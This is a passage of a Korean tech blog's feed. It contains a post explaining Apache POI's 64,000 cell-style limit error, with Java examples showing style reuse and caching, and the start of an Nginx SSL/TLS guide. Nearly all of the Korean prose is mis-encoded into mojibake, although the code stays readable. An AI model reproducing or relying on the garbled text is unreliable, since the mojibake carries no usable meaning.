cell.setCellValue(data.get(i));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;ìœ„ ì½”ë“œì—ì„œ 10,000ê°œì˜ í–‰ì„ ì²˜ë¦¬í•œë‹¤ë©´, 10,000ê°œì˜ ë™ì¼í•œ ìŠ¤íƒ€ì¼ì´ ìƒì„±ë˜ì–´ ë©”ëª¨ë¦¬ë¥¼ ë‚­ë¹„í•˜ê³  ê²°êµ­ 64,000ê°œ ì œí•œì— ë„ë‹¬í•˜ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/java/java.png"></p><h2 id="ë¬¸ì œ-ìƒí™©"><a href="#ë¬¸ì œ-ìƒí™©" class="headerlink" title="ë¬¸ì œ ìƒí™©"></a>ë¬¸ì œ ìƒí™©</h2><p>Apache POIë¥¼ ì‚¬ìš©í•˜ì—¬ Excel íŒŒì¼(.xlsx)ì„ ìƒì„±í•˜ê±°ë‚˜ ìˆ˜ì •í•  ë•Œ ë‹¤ìŒê³¼ ê°™ì€ ì˜¤ë¥˜ê°€ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalStateException: The maximum number of Cell Styles was exceeded.</span><br><span class="line">You can define up to 64000 style in a .xlsx Workbook</span><br></pre></td></tr></table></figure><h2 id="ë°œìƒ-ì›ì¸"><a href="#ë°œìƒ-ì›ì¸" class="headerlink" title="ë°œìƒ ì›ì¸"></a>ë°œìƒ ì›ì¸</h2><h3 id="1-Cell-Style-ìƒì„±-ë°©ì‹ì˜-ë¬¸ì œ"><a href="#1-Cell-Style-ìƒì„±-ë°©ì‹ì˜-ë¬¸ì œ" class="headerlink" title="1. Cell Style ìƒì„± ë°©ì‹ì˜ ë¬¸ì œ"></a>1. Cell Style ìƒì„± ë°©ì‹ì˜ ë¬¸ì œ</h3><p>Excelì˜ <code>.xlsx</code> íŒŒì¼ í˜•ì‹ì—ì„œëŠ” <strong>ìµœëŒ€ 64,000ê°œì˜ Cell Style</strong>ë§Œ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì œí•œì€ Excel íŒŒì¼ í¬ë§·ì˜ ìŠ¤í™ì— ì •ì˜ëœ í•˜ë“œ ë¦¬ë¯¸íŠ¸ì…ë‹ˆë‹¤.</p><p>ì¼ë°˜ì ìœ¼ë¡œ ì´ ì˜¤ë¥˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ìƒí™©ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì˜ëª»ëœ ì˜ˆì‹œ - ë°˜ë³µë¬¸ ì•ˆì—ì„œ ë§¤ë²ˆ ìƒˆë¡œìš´ ìŠ¤íƒ€ì¼ ìƒì„±</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; rows.size(); i++) &#123;</span><br><span class="line">    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.createRow(i);</span><br><span class="line">    <span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> row.createCell(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ë§¤ ì…€ë§ˆë‹¤ ìƒˆë¡œìš´ ìŠ¤íƒ€ì¼ì„ ìƒì„± (ë¬¸ì œ!)</span></span><br><span class="line">    <span class="type">CellStyle</span> <span class="variable">style</span> <span class="operator">=</span> workbook.createCellStyle();</span><br><span class="line">    <span class="type">Font</span> <span class="variable">font</span> <span class="operator">=</span> workbook.createFont();</span><br><span class="line">    font.setBold(<span class="literal">true</span>);</span><br><span class="line">    style.setFont(font);</span><br><span class="line"></span><br><span class="line">    cell.setCellStyle(style);</span><br><span class="line">    cell.setCellValue(data.get(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ìœ„ ì½”ë“œì—ì„œ 10,000ê°œì˜ í–‰ì„ ì²˜ë¦¬í•œë‹¤ë©´, 10,000ê°œì˜ ë™ì¼í•œ ìŠ¤íƒ€ì¼ì´ ìƒì„±ë˜ì–´ ë©”ëª¨ë¦¬ë¥¼ ë‚­ë¹„í•˜ê³  ê²°êµ­ 64,000ê°œ ì œí•œì— ë„ë‹¬í•˜ê²Œ ë©ë‹ˆë‹¤.</p><h3 id="2-xlsx-vs-xls-ì°¨ì´ì "><a href="#2-xlsx-vs-xls-ì°¨ì´ì " class="headerlink" title="2. .xlsx vs .xls ì°¨ì´ì "></a>2. .xlsx vs .xls ì°¨ì´ì </h3><ul><li><code>.xls</code> (HSSF): ìµœëŒ€ <strong>4,000ê°œ</strong>ì˜ Cell Style ì œí•œ</li><li><code>.xlsx</code> (XSSF): ìµœëŒ€ <strong>64,000ê°œ</strong>ì˜ Cell Style ì œí•œ</li></ul><h2 id="í•´ê²°-ë°©ë²•"><a href="#í•´ê²°-ë°©ë²•" class="headerlink" title="í•´ê²° ë°©ë²•"></a>í•´ê²° ë°©ë²•</h2><h3 id="ë°©ë²•-1-Cell-Style-ì¬ì‚¬ìš©-ê¶Œì¥"><a href="#ë°©ë²•-1-Cell-Style-ì¬ì‚¬ìš©-ê¶Œì¥" class="headerlink" title="ë°©ë²• 1: Cell Style ì¬ì‚¬ìš© (ê¶Œì¥)"></a>ë°©ë²• 1: Cell Style ì¬ì‚¬ìš© (ê¶Œì¥)</h3><p>ê°€ì¥ íš¨ìœ¨ì ì¸ ë°©ë²•ì€ í•„ìš”í•œ ìŠ¤íƒ€ì¼ì„ ë¯¸ë¦¬ ìƒì„±í•˜ê³  ì¬ì‚¬ìš©í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì˜¬ë°”ë¥¸ ì˜ˆì‹œ - ìŠ¤íƒ€ì¼ì„ ë¯¸ë¦¬ ìƒì„±í•˜ê³  ì¬ì‚¬ìš©</span></span><br><span class="line"><span class="type">Workbook</span> <span class="variable">workbook</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XSSFWorkbook</span>();</span><br><span class="line"><span class="type">Sheet</span> <span class="variable">sheet</span> <span class="operator">=</span> workbook.createSheet(<span class="string">&quot;Data&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ìŠ¤íƒ€ì¼ì„ í•œ ë²ˆë§Œ ìƒì„±</span></span><br><span class="line"><span class="type">CellStyle</span> <span class="variable">boldStyle</span> <span class="operator">=</span> workbook.createCellStyle();</span><br><span class="line"><span class="type">Font</span> <span class="variable">boldFont</span> <span class="operator">=</span> workbook.createFont();</span><br><span class="line">boldFont.setBold(<span class="literal">true</span>);</span><br><span class="line">boldStyle.setFont(boldFont);</span><br><span class="line"></span><br><span class="line"><span class="type">CellStyle</span> <span class="variable">normalStyle</span> <span class="operator">=</span> workbook.createCellStyle();</span><br><span class="line"><span class="type">Font</span> <span class="variable">normalFont</span> <span class="operator">=</span> workbook.createFont();</span><br><span class="line">normalStyle.setFont(normalFont);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ë°˜ë³µë¬¸ì—ì„œ ìŠ¤íƒ€ì¼ ì¬ì‚¬ìš©</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; rows.size(); i++) &#123;</span><br><span class="line">    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.createRow(i);</span><br><span class="line">    <span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> row.createCell(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ì¡°ê±´ì— ë”°ë¼ ë¯¸ë¦¬ ìƒì„±ëœ ìŠ¤íƒ€ì¼ ì¬ì‚¬ìš©</span></span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        cell.setCellStyle(boldStyle);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cell.setCellStyle(normalStyle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cell.setCellValue(data.get(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ë°©ë²•-2-Style-Map-í™œìš©"><a href="#ë°©ë²•-2-Style-Map-í™œìš©" class="headerlink" title="ë°©ë²• 2: Style Map í™œìš©"></a>ë°©ë²• 2: Style Map í™œìš©</h3><p>ì—¬ëŸ¬ ì¢…ë¥˜ì˜ ìŠ¤íƒ€ì¼ì´ í•„ìš”í•œ ê²½ìš°, Mapì„ ì‚¬ìš©í•˜ì—¬ ìŠ¤íƒ€ì¼ì„ ê´€ë¦¬í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExcelStyleManager</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Workbook workbook;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, CellStyle&gt; styleCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExcelStyleManager</span><span class="params">(Workbook workbook)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.workbook = workbook;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> CellStyle <span class="title function_">getStyle</span><span class="params">(String styleKey)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> styleCache.computeIfAbsent(styleKey, key -&gt; createStyle(key));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> CellStyle <span class="title function_">createStyle</span><span class="params">(String styleKey)</span> &#123;</span><br><span class="line">        <span class="type">CellStyle</span> <span class="variable">style</span> <span class="operator">=</span> workbook.createCellStyle();</span><br><span class="line">        <span class="type">Font</span> <span class="variable">font</span> <span class="operator">=</span> workbook.createFont();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (styleKey) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;BOLD&quot;</span>:</span><br><span class="line">                font.setBold(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;ITALIC&quot;</span>:</span><br><span class="line">                font.setItalic(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;HEADER&quot;</span>:</span><br><span class="line">                font.setBold(<span class="literal">true</span>);</span><br><span class="line">                font.setFontHeightInPoints((<span class="type">short</span>) <span class="number">14</span>);</span><br><span class="line">                style.setFillForegroundColor(IndexedColors.GREY_25_PERCENT.getIndex());</span><br><span class="line">                style.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// normal style</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        style.setFont(font);</span><br><span class="line">        <span class="keyword">return</span> style;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì‚¬ìš© ì˜ˆì‹œ</span></span><br><span class="line"><span class="type">ExcelStyleManager</span> <span class="variable">styleManager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ExcelStyleManager</span>(workbook);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; rows.size(); i++) &#123;</span><br><span class="line">    <span class="type">Row</span> <span class="variable">row</span> <span class="operator">=</span> sheet.createRow(i);</span><br><span class="line">    <span class="type">Cell</span> <span class="variable">cell</span> <span class="operator">=</span> row.createCell(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</span><br><span class="line">        cell.setCellStyle(styleManager.getStyle(<span class="string">&quot;HEADER&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cell.setCellStyle(styleManager.getStyle(<span class="string">&quot;BOLD&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cell.setCellValue(data.get(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ë°©ë²•-3-ì¡°ê±´ë¶€-ìŠ¤íƒ€ì¼-ìƒì„±-ìµœì†Œí™”"><a href="#ë°©ë²•-3-ì¡°ê±´ë¶€-ìŠ¤íƒ€ì¼-ìƒì„±-ìµœì†Œí™”" class="headerlink" title="ë°©ë²• 3: ì¡°ê±´ë¶€ ìŠ¤íƒ€ì¼ ìƒì„± ìµœì†Œí™”"></a>ë°©ë²• 3: ì¡°ê±´ë¶€ ìŠ¤íƒ€ì¼ ìƒì„± ìµœì†Œí™”</h3><p>ë‚ ì§œ, ìˆ«ì í¬ë§· ë“± ë™ì ìœ¼ë¡œ ìŠ¤íƒ€ì¼ì„ ìƒì„±í•´ì•¼ í•˜ëŠ” ê²½ìš°, í•„ìš”í•œ íŒ¨í„´ë“¤ì„ ë¯¸ë¦¬ ì •ì˜í•©ë‹ˆë‹¤.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ì˜ëª»ëœ ì˜ˆì‹œ</span></span><br><span class="line"><span class="keyword">for</span> (Cell cell : cells) &#123;</span><br><span class="line">    <span class="type">CellStyle</span> <span class="variable">dateStyle</span> <span class="operator">=</span> workbook.createCellStyle();</span><br><span class="line">    dateStyle.setDataFormat(</span><br><span class="line">        createHelper.createDataFormat().getFormat(<span class="string">&quot;yyyy-mm-dd&quot;</span>)</span><br><span class="line">    );</span><br><span class="line">    cell.setCellStyle(dateStyle);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ì˜¬ë°”ë¥¸ ì˜ˆì‹œ</span></span><br><span class="line"><span class="type">CreationHelper</span> <span class="variable">createHelper</span> <span class="operator">=</span> workbook.getCreationHelper();</span><br><span class="line"><span class="type">CellStyle</span> <span class="variable">dateStyle</span> <span class="operator">=</span> workbook.createCellStyle();</span><br><span class="line">dateStyle.setDataFormat(</span><br><span class="line">    createHelper.createDataFormat().getFormat(<span class="string">&quot;yyyy-mm-dd&quot;</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Cell cell : cells) &#123;</span><br><span class="line">    cell.setCellStyle(dateStyle); <span class="comment">// ì¬ì‚¬ìš©</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Best-Practices"><a href="#Best-Practices" class="headerlink" title="Best Practices"></a>Best Practices</h2><ol><li><p><strong>ìŠ¤íƒ€ì¼ì„ Workbook ìƒì„± ì§í›„ì— ë¯¸ë¦¬ ì •ì˜</strong></p><ul><li>í•„ìš”í•œ ëª¨ë“  ìŠ¤íƒ€ì¼ì„ ì´ˆê¸°í™” ë‹¨ê³„ì—ì„œ ìƒì„±</li></ul></li><li><p><strong>ìŠ¤íƒ€ì¼ íŒ©í† ë¦¬ íŒ¨í„´ ì‚¬ìš©</strong></p><ul><li>StyleManager í´ë˜ìŠ¤ë¥¼ ë§Œë“¤ì–´ ì¤‘ì•™ ì§‘ì¤‘ì‹ìœ¼ë¡œ ê´€ë¦¬</li></ul></li><li><p><strong>ìŠ¤íƒ€ì¼ ê°œìˆ˜ ëª¨ë‹ˆí„°ë§</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// í˜„ì¬ ìƒì„±ëœ ìŠ¤íƒ€ì¼ ê°œìˆ˜ í™•ì¸</span></span><br><span class="line"><span class="type">int</span> <span class="variable">numCellStyles</span> <span class="operator">=</span> workbook.getNumCellStyles();</span><br><span class="line">System.out.println(<span class="string">&quot;í˜„ì¬ ìŠ¤íƒ€ì¼ ê°œìˆ˜: &quot;</span> + numCellStyles);</span><br></pre></td></tr></table></figure></li><li><p><strong>í´ë˜ìŠ¤ ë ˆë²¨ì—ì„œ ìŠ¤íƒ€ì¼ ê´€ë¦¬</strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExcelGenerator</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CellStyle headerStyle;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CellStyle dataStyle;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> CellStyle numberStyle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ExcelGenerator</span><span class="params">(Workbook workbook)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.headerStyle = createHeaderStyle(workbook);</span><br><span class="line">        <span class="built_in">this</span>.dataStyle = createDataStyle(workbook);</span><br><span class="line">        <span class="built_in">this</span>.numberStyle = createNumberStyle(workbook);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... ë‚˜ë¨¸ì§€ ì½”ë“œ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="ì„±ëŠ¥-ë¹„êµ"><a href="#ì„±ëŠ¥-ë¹„êµ" class="headerlink" title="ì„±ëŠ¥ ë¹„êµ"></a>ì„±ëŠ¥ ë¹„êµ</h2><table><thead><tr><th>ë°©ì‹</th><th>10,000í–‰ ì²˜ë¦¬ ì‹œ ìŠ¤íƒ€ì¼ ê°œìˆ˜</th><th>ë©”ëª¨ë¦¬ ì‚¬ìš©ëŸ‰</th></tr></thead><tbody><tr><td>ë§¤ë²ˆ ìƒì„±</td><td>10,000ê°œ</td><td>ë†’ìŒ</td></tr><tr><td>ì¬ì‚¬ìš©</td><td>3-5ê°œ</td><td>ë‚®ìŒ</td></tr></tbody></table>]]></content:encoded>
      
      
      <category domain="https://ckck803.github.io/categories/Develop/">Develop</category>
      
      <category domain="https://ckck803.github.io/categories/Develop/JAVA/">JAVA</category>
      
      
      <category domain="https://ckck803.github.io/tags/Java/">Java</category>
      
      <category domain="https://ckck803.github.io/tags/Apache-POI/">Apache POI</category>
      
      <category domain="https://ckck803.github.io/tags/Excel/">Excel</category>
      
      <category domain="https://ckck803.github.io/tags/Exception/">Exception</category>
      
      
      <comments>https://ckck803.github.io/2025/12/21/java/excel-cell-style-limit/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Nginx SSL/TLS ì ìš©í•˜ê¸°</title>
      <link>https://ckck803.github.io/2025/12/11/infra/nginx-ssl-guide/</link>
      <guid>https://ckck803.github.io/2025/12/11/infra/nginx-ssl-guide/</guid>
      <pubDate>Thu, 11 Dec 2025 14:45:00 GMT</pubDate>
      
      <description>&lt;p&gt;&lt;img src=&quot;/images/springboot/sample-board/nginx/nginx.png&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;SSL-TLSë€&quot;&gt;&lt;a href=&quot;#SSL-TLSë€&quot; class=&quot;headerlink&quot; title=&quot;SSL&amp;#x2F;TLSë€?&quot;&gt;&lt;/a&gt;SSL&amp;#x2F;TLSë€?&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;SSL (Secure Sockets Layer)&lt;/strong&gt; ê³¼ &lt;strong&gt;TLS (Transport Layer Security)&lt;/strong&gt; ëŠ” ì¸í„°ë„· í†µì‹ ì„ ì•”í˜¸í™”í•˜ëŠ” í”„ë¡œí† ì½œì…ë‹ˆë‹¤. 1994ë…„ ë„·ìŠ¤ì¼€ì´í”„ì—ì„œ SSL 1.0ì„ ê°œë°œí•œ ì´í›„, SSLì€ ì›¹ ë³´ì•ˆì˜ í‘œì¤€ìœ¼ë¡œ ìë¦¬ì¡ì•˜ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì—¬ëŸ¬ ë³´ì•ˆ ì·¨ì•½ì ì´ ë°œê²¬ë˜ë©´ì„œ 1999ë…„ IETF(Internet Engineering Task Force)ëŠ” SSL 3.0ì„ ê¸°ë°˜ìœ¼ë¡œ í•œ TLS 1.0ì„ ë°œí‘œí–ˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;p&gt;í˜„ì¬ SSL 3.0ê³¼ TLS 1.0, 1.1ì€ ë³´ì•ˆìƒì˜ ì´ìœ ë¡œ íê¸°ë˜ì—ˆìœ¼ë©°, &lt;strong&gt;TLS 1.2&lt;/strong&gt;(2008ë…„ ë°œí‘œ)ì™€ &lt;strong&gt;TLS 1.3&lt;/strong&gt;(2018ë…„ ë°œí‘œ)ë§Œ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³  ì—­ì‚¬ì  ì´ìœ ì™€ ê´€ë¡€ìƒ â€œSSL ì¸ì¦ì„œâ€ ë˜ëŠ” â€œSSL&amp;#x2F;TLSâ€ë¼ëŠ” ìš©ì–´ë¥¼ ê³„ì† ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;SSL-TLSì˜-ì‘ë™-ì›ë¦¬&quot;&gt;&lt;a href=&quot;#SSL-TLSì˜-ì‘ë™-ì›ë¦¬&quot; class=&quot;headerlink&quot; title=&quot;SSL&amp;#x2F;TLSì˜ ì‘ë™ ì›ë¦¬&quot;&gt;&lt;/a&gt;SSL&amp;#x2F;TLSì˜ ì‘ë™ ì›ë¦¬&lt;/h3&gt;&lt;p&gt;SSL&amp;#x2F;TLSëŠ” &lt;strong&gt;ë¹„ëŒ€ì¹­ ì•”í˜¸í™”&lt;/strong&gt;ì™€ &lt;strong&gt;ëŒ€ì¹­ ì•”í˜¸í™”&lt;/strong&gt;ë¥¼ ì¡°í•©í•˜ì—¬ ì•ˆì „í•œ í†µì‹ ì„ ì œê³µí•©ë‹ˆë‹¤:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;í•¸ë“œì…°ì´í¬ ë‹¨ê³„&lt;/strong&gt;: í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ê°€ ë¹„ëŒ€ì¹­ ì•”í˜¸í™”(ê³µê°œí‚¤&amp;#x2F;ê°œì¸í‚¤)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•ˆì „í•˜ê²Œ ì„¸ì…˜í‚¤ë¥¼ êµí™˜í•©ë‹ˆë‹¤.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ë°ì´í„° ì „ì†¡ ë‹¨ê³„&lt;/strong&gt;: êµí™˜ëœ ì„¸ì…˜í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€ì¹­ ì•”í˜¸í™”ë¡œ ë¹ ë¥´ê²Œ ë°ì´í„°ë¥¼ ì•”í˜¸í™”&amp;#x2F;ë³µí˜¸í™”í•©ë‹ˆë‹¤.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ê²€ì¦ ë‹¨ê³„&lt;/strong&gt;: ì¸ì¦ì„œë¥¼ í†µí•´ ì„œë²„ì˜ ì‹ ì›ì„ í™•ì¸í•˜ê³ , ë©”ì‹œì§€ ì¸ì¦ ì½”ë“œ(MAC)ë¡œ ë°ì´í„° ë¬´ê²°ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ì´ëŸ¬í•œ êµ¬ì¡° ë•ë¶„ì— SSL&amp;#x2F;TLSëŠ” ë†’ì€ ë³´ì•ˆì„±ê³¼ íš¨ìœ¨ì„±ì„ ë™ì‹œì— ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;
&lt;h3 id=&quot;ì™œ-SSL-TLSê°€-í•„ìˆ˜ì¸ê°€&quot;&gt;&lt;a href=&quot;#ì™œ-SSL-TLSê°€-í•„ìˆ˜ì¸ê°€&quot; class=&quot;headerlink&quot; title=&quot;ì™œ SSL&amp;#x2F;TLSê°€ í•„ìˆ˜ì¸ê°€?&quot;&gt;&lt;/a&gt;ì™œ SSL&amp;#x2F;TLSê°€ í•„ìˆ˜ì¸ê°€?&lt;/h3&gt;&lt;h4 id=&quot;1-ë°ì´í„°-ì•”í˜¸í™”-ë„ì²­-ë°©ì§€&quot;&gt;&lt;a href=&quot;#1-ë°ì´í„°-ì•”í˜¸í™”-ë„ì²­-ë°©ì§€&quot; class=&quot;headerlink&quot; title=&quot;1. ë°ì´í„° ì•”í˜¸í™” - ë„ì²­ ë°©ì§€&quot;&gt;&lt;/a&gt;1. &lt;strong&gt;ë°ì´í„° ì•”í˜¸í™” - ë„ì²­ ë°©ì§€&lt;/strong&gt;&lt;/h4&gt;</description>
      
      
      
      <content:encoded><![CDATA[<p><img src="/images/springboot/sample-board/nginx/nginx.png"></p><h2 id="SSL-TLSë€"><a href="#SSL-TLSë€" class="headerlink" title="SSL&#x2F;TLSë€?"></a>SSL&#x2F;TLSë€?</h2><p><strong>SSL (Secure Sockets Layer)</strong> ê³¼ <strong>TLS (Transport Layer Security)</strong> ëŠ” ì¸í„°ë„· í†µì‹ ì„ ì•”í˜¸í™”í•˜ëŠ” í”„ë¡œí† ì½œì…ë‹ˆë‹¤. 1994ë…„ ë„·ìŠ¤ì¼€ì´í”„ì—ì„œ SSL 1.0ì„ ê°œë°œí•œ ì´í›„, SSLì€ ì›¹ ë³´ì•ˆì˜ í‘œì¤€ìœ¼ë¡œ ìë¦¬ì¡ì•˜ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì—¬ëŸ¬ ë³´ì•ˆ ì·¨ì•½ì ì´ ë°œê²¬ë˜ë©´ì„œ 1999ë…„ IETF(Internet Engineering Task Force)ëŠ” SSL 3.0ì„ ê¸°ë°˜ìœ¼ë¡œ í•œ TLS 1.0ì„ ë°œí‘œí–ˆìŠµë‹ˆë‹¤.</p><p>í˜„ì¬ SSL 3.0ê³¼ TLS 1.0, 1.1ì€ ë³´ì•ˆìƒì˜ ì´ìœ ë¡œ íê¸°ë˜ì—ˆìœ¼ë©°, <strong>TLS 1.2</strong>(2008ë…„ ë°œí‘œ)ì™€ <strong>TLS 1.3</strong>(2018ë…„ ë°œí‘œ)ë§Œ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³  ì—­ì‚¬ì  ì´ìœ ì™€ ê´€ë¡€ìƒ â€œSSL ì¸ì¦ì„œâ€ ë˜ëŠ” â€œSSL&#x2F;TLSâ€ë¼ëŠ” ìš©ì–´ë¥¼ ê³„ì† ì‚¬ìš©í•˜ê³  ìˆìŠµë‹ˆë‹¤.</p><h3 id="SSL-TLSì˜-ì‘ë™-ì›ë¦¬"><a href="#SSL-TLSì˜-ì‘ë™-ì›ë¦¬" class="headerlink" title="SSL&#x2F;TLSì˜ ì‘ë™ ì›ë¦¬"></a>SSL&#x2F;TLSì˜ ì‘ë™ ì›ë¦¬</h3><p>SSL&#x2F;TLSëŠ” <strong>ë¹„ëŒ€ì¹­ ì•”í˜¸í™”</strong>ì™€ <strong>ëŒ€ì¹­ ì•”í˜¸í™”</strong>ë¥¼ ì¡°í•©í•˜ì—¬ ì•ˆì „í•œ í†µì‹ ì„ ì œê³µí•©ë‹ˆë‹¤:</p><ol><li><strong>í•¸ë“œì…°ì´í¬ ë‹¨ê³„</strong>: í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ê°€ ë¹„ëŒ€ì¹­ ì•”í˜¸í™”(ê³µê°œí‚¤&#x2F;ê°œì¸í‚¤)ë¥¼ ì‚¬ìš©í•˜ì—¬ ì•ˆì „í•˜ê²Œ ì„¸ì…˜í‚¤ë¥¼ êµí™˜í•©ë‹ˆë‹¤.</li><li><strong>ë°ì´í„° ì „ì†¡ ë‹¨ê³„</strong>: êµí™˜ëœ ì„¸ì…˜í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ëŒ€ì¹­ ì•”í˜¸í™”ë¡œ ë¹ ë¥´ê²Œ ë°ì´í„°ë¥¼ ì•”í˜¸í™”&#x2F;ë³µí˜¸í™”í•©ë‹ˆë‹¤.</li><li><strong>ê²€ì¦ ë‹¨ê³„</strong>: ì¸ì¦ì„œë¥¼ í†µí•´ ì„œë²„ì˜ ì‹ ì›ì„ í™•ì¸í•˜ê³ , ë©”ì‹œì§€ ì¸ì¦ ì½”ë“œ(MAC)ë¡œ ë°ì´í„° ë¬´ê²°ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤.</li></ol><p>ì´ëŸ¬í•œ êµ¬ì¡° ë•ë¶„ì— SSL&#x2F;TLSëŠ” ë†’ì€ ë³´ì•ˆì„±ê³¼ íš¨ìœ¨ì„±ì„ ë™ì‹œì— ì œê³µí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h3 id="ì™œ-SSL-TLSê°€-í•„ìˆ˜ì¸ê°€"><a href="#ì™œ-SSL-TLSê°€-í•„ìˆ˜ì¸ê°€" class="headerlink" title="ì™œ SSL&#x2F;TLSê°€ í•„ìˆ˜ì¸ê°€?"></a>ì™œ SSL&#x2F;TLSê°€ 